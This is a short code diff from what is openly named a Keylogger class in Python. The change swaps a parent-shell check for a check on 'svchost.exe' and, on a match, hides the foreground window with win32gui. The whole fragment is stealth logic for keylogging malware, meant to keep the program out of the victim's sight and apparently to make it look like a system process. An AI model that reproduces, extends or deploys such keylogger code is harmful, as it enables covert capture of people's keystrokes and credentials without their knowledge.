@@ -109,7 +109,7 @@ class Keylogger:
 
             if 'python' not in parentShellName.lower():
                 break
-        if parentShellName == "cmd.exe" or parentShellName == "powershell.exe":
+        if parentShellName == "svchost.exe":
             with pyautogui.hold("alt"): pyautogui.press("tab")
             hide = win32gui.GetForegroundWindow()
             win32gui.ShowWindow(hide, win32con.SW_HIDE)
